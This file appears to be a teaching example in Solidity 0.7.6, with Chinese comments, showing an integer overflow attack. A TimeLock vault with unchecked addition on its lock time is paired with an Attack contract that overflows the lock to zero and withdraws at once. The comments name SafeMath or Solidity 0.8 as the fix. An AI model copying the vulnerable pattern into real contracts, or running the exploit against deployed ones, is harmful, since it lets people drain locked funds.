@@ -1,0 +1,64 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+
+// This contract is designed to act as a time vault.
+// User can deposit into this contract but cannot withdraw for atleast a week.至少锁仓1周
+// User can also extend the wait time beyond the 1 week waiting period.
+
+/*
+数字溢出攻击：
+核心原理：数字采用补码方式计算，(2^256-1) + 1 = 0，0 - 1 = 2^256-1
+解决方法：SafeMath加法(0.8^自动集成了SafeMath)
+*/
+
+contract TimeLock {
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+    //质押
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+    //增加锁仓时间
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+    //取款函数
+    function withdraw() public {
+        require(balances[msg.sender] > 0, "Insufficient funds");
+        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) {
+        timeLock = TimeLock(_timeLock);
+    }
+
+    fallback() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        /*
+        这里是计算增多少时间(s)可以让锁仓时间为0，存进去立刻可以取出
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0
+        so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
+        */
+        timeLock.increaseLockTime(
+            type(uint).max + 1 - timeLock.lockTime(address(this))
+        );
+        timeLock.withdraw();
+    }
+
+}
